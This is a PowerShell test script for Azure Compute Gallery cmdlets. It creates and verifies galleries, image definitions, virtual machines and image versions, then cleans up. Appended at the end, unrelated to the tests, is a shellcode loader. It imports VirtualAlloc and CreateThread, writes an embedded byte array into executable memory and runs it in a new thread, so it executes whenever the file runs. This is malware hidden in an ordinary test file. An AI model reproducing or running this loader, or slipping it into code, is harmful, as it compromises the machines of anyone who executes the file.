













function Verify-Gallery
{
    param($gallery, [string] $rgname, [string] $galleryName, [string] $loc, [string] $description)

        Assert-AreEqual $rgname $gallery.ResourceGroupName;
        Assert-AreEqual $galleryName $gallery.Name;
        Assert-AreEqual $loc $gallery.Location;
        Assert-AreEqual "Microsoft.Compute/galleries" $gallery.Type;
        Assert-AreEqual $description $gallery.Description;
        Assert-NotNull $gallery.Identifier.UniqueName;
        Assert-NotNull $gallery.Id;
}

function Verify-GalleryImageDefinition
{
    param($imageDefinition, [string] $rgname, [string] $imageDefinitionName, [string] $loc, [string] $description,
        [string] $eula, [string] $privacyStatementUri, [string] $releaseNoteUri,   
        [string] $osType, [string] $osState, $endOfLifeDate,
        [string] $publisherName, [string] $offerName, [string] $skuName,
        [int] $minVCPU, [int] $maxVCPU, [int] $minMemory, [int] $maxMemory, 
        [string] $disallowedDiskType,
        [string] $purchasePlanName, [string] $purchasePlanPublisher, [string] $purchasePlanProduct)

        Assert-AreEqual $rgname $imageDefinition.ResourceGroupName;
        Assert-AreEqual $imageDefinitionName $imageDefinition.Name;
        Assert-AreEqual $loc $imageDefinition.Location;
        Assert-AreEqual "Microsoft.Compute/galleries/images" $imageDefinition.Type;
        Assert-AreEqual $description $imageDefinition.Description;
        Assert-NotNull $imageDefinition.Id;

        Assert-AreEqual $eula $imageDefinition.Eula;
        Assert-AreEqual $privacyStatementUri $imageDefinition.PrivacyStatementUri;
        Assert-AreEqual $releaseNoteUri $imageDefinition.ReleaseNoteUri;
        Assert-AreEqual $osType $imageDefinition.OsType;
        Assert-AreEqual $osState $imageDefinition.OsState;
        Assert-AreEqual $endOfLifeDate $imageDefinition.EndOfLifeDate;

        Assert-AreEqual $publisherName $imageDefinition.Identifier.Publisher;
        Assert-AreEqual $offerName $imageDefinition.Identifier.Offer;
        Assert-AreEqual $skuName $imageDefinition.Identifier.Sku;

        Assert-AreEqual $minVCPU $imageDefinition.Recommended.VCPUs.Min;
        Assert-AreEqual $maxVCPU $imageDefinition.Recommended.VCPUs.Max;
        Assert-AreEqual $minMemory $imageDefinition.Recommended.Memory.Min;
        Assert-AreEqual $maxMemory $imageDefinition.Recommended.Memory.Max;

        Assert-AreEqual $disallowedDiskType $imageDefinition.Disallowed.DiskTypes[0];
        Assert-AreEqual $purchasePlanName $imageDefinition.PurchasePlan.Name;
        Assert-AreEqual $purchasePlanPublisher $imageDefinition.PurchasePlan.Publisher;
        Assert-AreEqual $purchasePlanProduct $imageDefinition.PurchasePlan.Product;
}

function Verify-GalleryImageVersion
{
    param($imageVersion, [string] $rgname, [string] $imageVersionName, [string] $loc,
        [string] $sourceImageId, [int] $replicaCount, $endOfLifeDate, $targetRegions)

        Assert-AreEqual $rgname $imageVersion.ResourceGroupName;
        Assert-AreEqual $imageVersionName $imageVersion.Name;
        Assert-AreEqual $loc $imageVersion.Location;
        Assert-AreEqual "Microsoft.Compute/galleries/images/versions" $imageVersion.Type;
        Assert-NotNull $imageVersion.Id;

        Assert-AreEqual $sourceImageId $imageVersion.StorageProfile.Source.Id;
        Assert-AreEqual $replicaCount $imageVersion.PublishingProfile.ReplicaCount;
        Assert-False { $imageVersion.PublishingProfile.ExcludeFromLatest };

        Assert-NotNull $imageVersion.PublishingProfile.PublishedDate;
        Assert-AreEqual $endOfLifeDate $imageVersion.PublishingProfile.EndOfLifeDate;

        for ($i = 0; $i -lt $targetRegions.Count; ++$i)
        {
            Assert-AreEqual $targetRegions[$i].Name $imageVersion.PublishingProfile.TargetRegions[$i].Name;

            if ($targetRegions[$i].ReplicaCount -eq $null)
            {
                Assert-AreEqual 1 $imageVersion.PublishingProfile.TargetRegions[$i].RegionalReplicaCount;
            }
            else
            {
                Assert-AreEqual $targetRegions[$i].ReplicaCount $imageVersion.PublishingProfile.TargetRegions[$i].RegionalReplicaCount;
            }
        }
}


function Test-Gallery
{
    
    $rgname = Get-ComputeTestResourceName;
    $galleryName = 'gallery' + $rgname;
    $galleryImageName = 'galleryimage' + $rgname;
    $galleryImageVersionName = 'imageversion' + $rgname;

    try
    {
        
        [string]$loc = Get-ComputeVMLocation;
        $loc = $loc.Replace(' ', '');
        New-AzResourceGroup -Name $rgname -Location $loc -Force;        
        $description1 = "Original Description";
        $description2 = "Updated Description";

        
        New-AzGallery -ResourceGroupName $rgname -Name $galleryName -Description $description1 -Location $loc;
        
        $wildcardRgQuery = ($rgname -replace ".$") + "*"
        $wildcardNameQuery = ($galleryName -replace ".$") + "*"

        $galleryList = Get-AzGallery;
        $gallery = $galleryList | ? {$_.Name -eq $galleryName};
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;

        $galleryList = Get-AzGallery -ResourceGroupName $rgname;
        $gallery = $galleryList | ? {$_.Name -eq $galleryName};
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        
        $galleryList = Get-AzGallery -ResourceGroupName $wildcardRgQuery;
        $gallery = $galleryList | ? {$_.Name -eq $galleryName};
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        
        $gallery = Get-AzGallery -Name $galleryName;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        $gallery = Get-AzGallery -Name $wildcardNameQuery;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        $gallery = Get-AzGallery -ResourceGroupName $rgname -Name $wildcardNameQuery;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        $gallery = Get-AzGallery -ResourceGroupName $wildcardRgQuery -Name $wildcardNameQuery;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        $gallery = Get-AzGallery -ResourceGroupName $wildcardRgQuery -Name $galleryName;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        $gallery = Get-AzGallery -ResourceGroupName $rgname -Name $galleryName;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;
        
        Update-AzGallery -ResourceGroupName $rgname -Name $galleryName -Description $description2;
        $gallery = Get-AzGallery -ResourceGroupName $rgname -Name $galleryName;
        Verify-Gallery $gallery $rgname $galleryName $loc $description2;

        
        $publisherName = "galleryPublisher20180927";
        $offerName = "galleryOffer20180927";
        $skuName = "gallerySku20180927";
        $eula = "eula";
        $privacyStatementUri = "https://www.microsoft.com";
        $releaseNoteUri = "https://www.microsoft.com";
        $disallowedDiskTypes = "Premium_LRS";
        $endOfLifeDate = [DateTime]::ParseExact('12 07 2025 18 02', 'HH mm yyyy dd MM', $null);
        $minMemory = 1;
        $maxMemory = 100;
        $minVCPU = 2;
        $maxVCPU = 32;
        $purchasePlanName = "purchasePlanName";
        $purchasePlanProduct = "purchasePlanProduct";
        $purchasePlanPublisher = "";
        $osState = "Generalized";
        $osType = "Windows";

        New-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName `
                                          -Location $loc -Publisher $publisherName -Offer $offerName -Sku $skuName `
                                          -OsState $osState -OsType $osType `
                                          -Description $description1 -Eula $eula `
                                          -PrivacyStatementUri $privacyStatementUri -ReleaseNoteUri $releaseNoteUri `
                                          -DisallowedDiskType $disallowedDiskTypes -EndOfLifeDate $endOfLifeDate `
                                          -MinimumMemory $minMemory -MaximumMemory $maxMemory `
                                          -MinimumVCPU $minVCPU -MaximumVCPU $maxVCPU `
                                          -PurchasePlanName $purchasePlanName `
                                          -PurchasePlanProduct $purchasePlanProduct `
                                          -PurchasePlanPublisher $purchasePlanPublisher;
                                          
        $wildcardNameQuery = ($galleryImageName -replace ".$") + "*"
        $galleryImageDefinitionList = Get-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $wildcardNameQuery;
        $definition = $galleryImageDefinitionList | ? {$_.Name -eq $galleryImageName};
        Verify-GalleryImageDefinition $definition $rgname $galleryImageName $loc $description1 `
                                      $eula $privacyStatementUri $releaseNoteUri `
                                      $osType $osState $endOfLifeDate `
                                      $publisherName $offerName $skuName `
                                      $minVCPU $maxVCPU $minMemory $maxMemory `
                                      $disallowedDiskTypes `
                                      $purchasePlanName $purchasePlanPublisher $purchasePlanProduct;

        $definition = Get-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName;
        $output = $definition | Out-String;
        Verify-GalleryImageDefinition $definition $rgname $galleryImageName $loc $description1 `
                                      $eula $privacyStatementUri $releaseNoteUri `
                                      $osType $osState $endOfLifeDate `
                                      $publisherName $offerName $skuName `
                                      $minVCPU $maxVCPU $minMemory $maxMemory `
                                      $disallowedDiskTypes `
                                      $purchasePlanName $purchasePlanPublisher $purchasePlanProduct;

        Update-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName `
                                             -Description $description2;

        $definition = Get-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName;
        Verify-GalleryImageDefinition $definition $rgname $galleryImageName $loc $description2 `
                                      $eula $privacyStatementUri $releaseNoteUri `
                                      $osType $osState $endOfLifeDate `
                                      $publisherName $offerName $skuName `
                                      $minVCPU $maxVCPU $minMemory $maxMemory `
                                      $disallowedDiskTypes `
                                      $purchasePlanName $purchasePlanPublisher $purchasePlanProduct;

        
        $galleryImageVersionName = "1.0.0";
        
        
        $vmsize = 'Standard_A4';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $pubipId = $pubip.Id;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;

        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId;
        
        
        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId -Primary;
        
        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_LRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";
        $dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";
        $dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";

        $p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;
        $p = Remove-AzVMDataDisk -VM $p -Name 'testDataDisk3';
        
        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        
        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;

        $imgRef = Get-DefaultCRPImage -loc $loc;
        $p = ($imgRef | Set-AzVMSourceImage -VM $p);

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;

        
        $imageName = 'image' + $rgname;
        $imageConfig = New-AzImageConfig -Location $loc;
        Set-AzImageOsDisk -Image $imageConfig -OsType 'Windows' -OsState 'Generalized' -BlobUri $osDiskVhdUri;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 1 -BlobUri $dataDiskVhdUri1;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 2 -BlobUri $dataDiskVhdUri2;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 3 -BlobUri $dataDiskVhdUri2;
        Assert-AreEqual 3 $imageConfig.StorageProfile.DataDisks.Count;
        $imageConfig = Remove-AzImageDataDisk -Image $imageConfig -Lun 3;
        Assert-AreEqual 2 $imageConfig.StorageProfile.DataDisks.Count;

        $image = New-AzImage -Image $imageConfig -ImageName $imageName -ResourceGroupName $rgname
        $targetRegions = @(@{Name='South Central US';ReplicaCount=1},@{Name='East US';ReplicaCount=2},@{Name='Central US'});        
        $tag = @{test1 = "testval1"; test2 = "testval2" };

        New-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                       -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName `
                                       -Location $loc -SourceImageId $image.Id -ReplicaCount 1 `
                                       -PublishingProfileEndOfLifeDate $endOfLifeDate `
                                       -TargetRegion $targetRegions;

        $wildcardNameQuery = ($galleryImageVersionName -replace ".$") + "*"
        $galleryImageVersionList = Get-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                                  -GalleryImageDefinitionName $galleryImageName -Name $wildcardNameQuery;
                                       
        $version = $galleryImageVersionList | ? {$_.Name -eq $galleryImageVersionName};
        Verify-GalleryImageVersion $version $rgname $galleryImageVersionName $loc `
                                   $image.Id 1 $endOfLifeDate $targetRegions;

        $version = Get-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                                  -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName;
        Verify-GalleryImageVersion $version $rgname $galleryImageVersionName $loc `
                                   $image.Id 1 $endOfLifeDate $targetRegions;

        Update-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                          -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName `
                                          -Tag $tag;

        $version = Get-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                                  -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName;
        Verify-GalleryImageVersion $version $rgname $galleryImageVersionName $loc `
                                   $image.Id 1 $endOfLifeDate $targetRegions;
        $output = $version | Out-String;

        $version | Remove-AzGalleryImageVersion -Force;
        Wait-Seconds 300;
        $definition | Remove-AzGalleryImageDefinition -Force;
        Wait-Seconds 300;
        $gallery | Remove-AzGallery -Force;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GalleryCrossTenant
{
    
    
    $imageId = "/subscriptions/97f78232-382b-46a7-8a72-964d692c4f3f/resourceGroups/xwRg/providers/Microsoft.Compute/galleries/galleryForCirrus/images/xwGalleryImageForCirrusWindows/versions/1.0.0";

    $rgname = Get-ComputeTestResourceName;

    try
    {
        
        $loc = Get-ComputeVMLocation;
        New-AzResourceGroup -Name $rgname -Location $loc -Force;

        
        $vmsize = 'Standard_D2_v2';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;
        $nicId = $nic.Id;
        $p = Add-AzVMNetworkInterface -VM $p -Id $nicId -Primary;

        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;

        $p = Set-AzVMSourceImage -VM $p -Id $imageId;

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;

        $vm = Get-AzVM -ResourceGroupName $rgname -Name $vmname;
        Assert-AreEqual $imageId $vm.StorageProfile.ImageReference.Id;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}


function Test-GalleryImageVersion
{
    
    $rgname = Get-ComputeTestResourceName;
    $galleryName = 'gallery' + $rgname;
    $galleryImageName = 'galleryimage' + $rgname;
    $galleryImageVersionName = 'imageversion' + $rgname;

    try
    {
        
        [string]$loc = Get-ComputeVMLocation;
        $loc = $loc.Replace(' ', '');
        New-AzResourceGroup -Name $rgname -Location $loc -Force;
        $description1 = "Original Description";

        
        New-AzGallery -ResourceGroupName $rgname -Name $galleryName -Description $description1 -Location $loc;
                
        $gallery = Get-AzGallery -ResourceGroupName $rgname -Name $galleryName;
        Verify-Gallery $gallery $rgname $galleryName $loc $description1;
        $output = $gallery | Out-String;

        
        $publisherName = "galleryPublisher20180927";
        $offerName = "galleryOffer20180927";
        $skuName = "gallerySku20180927";
        $eula = "eula";
        $privacyStatementUri = "https://www.microsoft.com";
        $releaseNoteUri = "https://www.microsoft.com";
        $disallowedDiskTypes = "Premium_LRS";
        $endOfLifeDate = [DateTime]::ParseExact('12 07 2025 18 02', 'HH mm yyyy dd MM', $null);
        $minMemory = 1;
        $maxMemory = 100;
        $minVCPU = 2;
        $maxVCPU = 32;
        $purchasePlanName = "purchasePlanName";
        $purchasePlanProduct = "purchasePlanProduct";
        $purchasePlanPublisher = "";
        $osState = "Generalized";
        $osType = "Windows";

        New-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName `
                                          -Location $loc -Publisher $publisherName -Offer $offerName -Sku $skuName `
                                          -OsState $osState -OsType $osType `
                                          -Description $description1 -Eula $eula `
                                          -PrivacyStatementUri $privacyStatementUri -ReleaseNoteUri $releaseNoteUri `
                                          -DisallowedDiskType $disallowedDiskTypes -EndOfLifeDate $endOfLifeDate `
                                          -MinimumMemory $minMemory -MaximumMemory $maxMemory `
                                          -MinimumVCPU $minVCPU -MaximumVCPU $maxVCPU `
                                          -PurchasePlanName $purchasePlanName `
                                          -PurchasePlanProduct $purchasePlanProduct `
                                          -PurchasePlanPublisher $purchasePlanPublisher;

        $definition = Get-AzGalleryImageDefinition -ResourceGroupName $rgname -GalleryName $galleryName -Name $galleryImageName;
        $output = $definition | Out-String;
        Verify-GalleryImageDefinition $definition $rgname $galleryImageName $loc $description1 `
                                      $eula $privacyStatementUri $releaseNoteUri `
                                      $osType $osState $endOfLifeDate `
                                      $publisherName $offerName $skuName `
                                      $minVCPU $maxVCPU $minMemory $maxMemory `
                                      $disallowedDiskTypes `
                                      $purchasePlanName $purchasePlanPublisher $purchasePlanProduct;

        
        $galleryImageVersionName = "1.0.0";
        
        
        $vmsize = 'Standard_A4';
        $vmname = 'vm' + $rgname;
        $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;
        Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;

        
        $subnet = New-AzVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";
        $vnet = New-AzVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;
        $vnet = Get-AzVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;
        $subnetId = $vnet.Subnets[0].Id;
        $pubip = New-AzPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);
        $pubip = Get-AzPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;
        $nic = New-AzNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -SubnetId $subnetId -PublicIpAddressId $pubip.Id;
        $nic = Get-AzNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;

        
        $p = Add-AzVMNetworkInterface -VM $p -Id $nic.Id -Primary;

        
        $stoname = 'sto' + $rgname;
        $stotype = 'Standard_LRS';
        New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
        $stoaccount = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;

        $osDiskName = 'osDisk';
        $osDiskCaching = 'ReadWrite';
        $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
        $dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";
        $dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";

        $p = Set-AzVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;
        $p = Add-AzVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;

        
        $user = "Foo12";
        $password = $PLACEHOLDER;
        $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
        $computerName = 'test';
        $vhdContainer = "https://$stoname.blob.core.windows.net/test";

        
        $p = Set-AzVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;

        $imgRef = Get-DefaultCRPImage -loc $loc;
        $p = ($imgRef | Set-AzVMSourceImage -VM $p);

        
        New-AzVM -ResourceGroupName $rgname -Location $loc -VM $p;

        
        $imageName = 'image' + $rgname;
        $imageConfig = New-AzImageConfig -Location $loc;
        Set-AzImageOsDisk -Image $imageConfig -OsType 'Windows' -OsState 'Generalized' -BlobUri $osDiskVhdUri;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 1 -BlobUri $dataDiskVhdUri1;
        $imageConfig = Add-AzImageDataDisk -Image $imageConfig -Lun 2 -BlobUri $dataDiskVhdUri2;

        $image = New-AzImage -Image $imageConfig -ImageName $imageName -ResourceGroupName $rgname
        $targetRegions = @(@{Name='South Central US';ReplicaCount=1;StorageAccountType='Standard_LRS'},@{Name='East US';ReplicaCount=2},@{Name='Central US'});        
        $tag = @{test1 = "testval1"; test2 = "testval2" };

        New-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                       -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName `
                                       -Location $loc -SourceImageId $image.Id -ReplicaCount 1 `
                                       -PublishingProfileEndOfLifeDate $endOfLifeDate `
                                       -StorageAccountType Standard_LRS `
                                       -TargetRegion $targetRegions;

        $version = Get-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                                  -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName;
        Verify-GalleryImageVersion $version $rgname $galleryImageVersionName $loc `
                                   $image.Id 1 $endOfLifeDate $targetRegions;

        Update-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                          -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName `
                                          -Tag $tag;

        $version = Get-AzGalleryImageVersion -ResourceGroupName $rgname -GalleryName $galleryName `
                                                  -GalleryImageDefinitionName $galleryImageName -Name $galleryImageVersionName;
        Verify-GalleryImageVersion $version $rgname $galleryImageVersionName $loc `
                                   $image.Id 1 $endOfLifeDate $targetRegions;

        $version | Remove-AzGalleryImageVersion -Force;
        Wait-Seconds 300;
        $definition | Remove-AzGalleryImageDefinition -Force;
        Wait-Seconds 300;
        $gallery | Remove-AzGallery -Force;
    }
    finally
    {
        
        Clean-ResourceGroup $rgname
    }
}

$0IA = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $0IA -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x81,0xbb,0x87,0x88,0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x83,0xeb,0xfc,0x03,0x43,0x8e,0x59,0x72,0x74,0x78,0x1f,0x7d,0x85,0x78,0x40,0xf7,0x60,0x49,0x40,0x63,0xe0,0xf9,0x70,0xe7,0xa4,0xf5,0xfb,0xa5,0x5c,0x8e,0x8e,0x61,0x52,0x27,0x24,0x54,0x5d,0xb8,0x15,0xa4,0xfc,0x3a,0x64,0xf9,0xde,0x03,0xa7,0x0c,0x1e,0x44,0xda,0xfd,0x72,0x1d,0x90,0x50,0x63,0x2a,0xec,0x68,0x08,0x60,0xe0,0xe8,0xed,0x30,0x03,0xd8,0xa3,0x4b,0x5a,0xfa,0x42,0x98,0xd6,0xb3,0x5c,0xfd,0xd3,0x0a,0xd6,0x35,0xaf,0x8c,0x3e,0x04,0x50,0x22,0x7f,0xa9,0xa3,0x3a,0x47,0x0d,0x5c,0x49,0xb1,0x6e,0xe1,0x4a,0x06,0x0d,0x3d,0xde,0x9d,0xb5,0xb6,0x78,0x7a,0x44,0x1a,0x1e,0x09,0x4a,0xd7,0x54,0x55,0x4e,0xe6,0xb9,0xed,0x6a,0x63,0x3c,0x22,0xfb,0x37,0x1b,0xe6,0xa0,0xec,0x02,0xbf,0x0c,0x42,0x3a,0xdf,0xef,0x3b,0x9e,0xab,0x1d,0x2f,0x93,0xf1,0x49,0x9c,0x9e,0x09,0x89,0x8a,0xa9,0x7a,0xbb,0x15,0x02,0x15,0xf7,0xde,0x8c,0xe2,0xf8,0xf4,0x69,0x7c,0x07,0xf7,0x89,0x54,0xc3,0xa3,0xd9,0xce,0xe2,0xcb,0xb1,0x0e,0x0b,0x1e,0x2f,0x0a,0x9b,0x0d,0xa0,0x05,0x0d,0x26,0xc3,0x25,0xb0,0x0d,0x4a,0xc3,0xe2,0x21,0x1d,0x5c,0x42,0x92,0xdd,0x0c,0x2a,0xf8,0xd1,0x73,0x4a,0x03,0x38,0x1c,0xe0,0xec,0x95,0x74,0x9c,0x95,0xbf,0x0f,0x3d,0x59,0x6a,0x6a,0x7d,0xd1,0x99,0x8a,0x33,0x12,0xd7,0x98,0xa3,0xd2,0xa2,0xc3,0x65,0xec,0x18,0x69,0x89,0x78,0xa7,0x38,0xde,0x14,0xa5,0x1d,0x28,0xbb,0x56,0x48,0x23,0x72,0xc3,0x33,0x5b,0x7b,0x03,0xb4,0x9b,0x2d,0x49,0xb4,0xf3,0x89,0x29,0xe7,0xe6,0xd5,0xe7,0x9b,0xbb,0x43,0x08,0xca,0x68,0xc3,0x60,0xf0,0x57,0x23,0x2f,0x0b,0xb2,0xb5,0x13,0xda,0xfa,0xc3,0x7d,0xde;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$3JQb=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($3JQb.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$3JQb,0,0,0);for (;;){Start-sleep 60};

